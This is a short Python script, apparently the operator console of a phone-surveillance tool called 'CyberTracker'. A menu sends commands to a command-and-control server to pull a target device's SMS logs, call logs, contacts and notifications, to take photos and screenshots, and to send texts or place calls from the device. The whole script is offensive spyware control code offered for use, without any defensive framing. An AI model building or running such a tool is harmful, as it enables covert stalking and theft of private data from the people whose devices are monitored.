import requests

SERVER_URL = "http://127.0.0.1:5000"  # Replace with your hosted Flask server URL

def send_command(action, params={}):
    url = f"{SERVER_URL}/send_command"
    data = {"action": action, "params": params}
    response = requests.post(url, json=data)
    print(response.json())

while True:
    print("\nCyberTracker Control Panel")
    print("1. Fetch Device Info")
    print("2. View SMS Logs")
    print("3. View Call Logs")
    print("4. View Contacts")
    print("5. View Notifications")
    print("6. Capture Photo")
    print("7. Take Screenshot")
    print("8. Send SMS")
    print("9. Make Call")
    print("10. Change Wallpaper")
    print("11. Exit")

    choice = input("Enter choice: ")

    if choice == "1":
        send_command("fetch_device_info")
    elif choice == "2":
        send_command("fetch_sms_logs")
    elif choice == "3":
        send_command("fetch_call_logs")
    elif choice == "4":
        send_command("fetch_contacts")
    elif choice == "5":
        send_command("fetch_notifications")
    elif choice == "6":
        send_command("capture_photo")
    elif choice == "7":
        send_command("take_screenshot")
    elif choice == "8":
        number = input("Enter Phone Number: ")
        message = input("Enter Message: ")
        send_command("send_sms", {"number": number, "message": message})
    elif choice == "9":
        number = input("Enter Phone Number: ")
        send_command("make_call", {"number": number})
    elif choice == "10":
        image_url = input("Enter Image URL: ")
        send_command("change_wallpaper", {"url": image_url})
    elif choice == "11":
        break
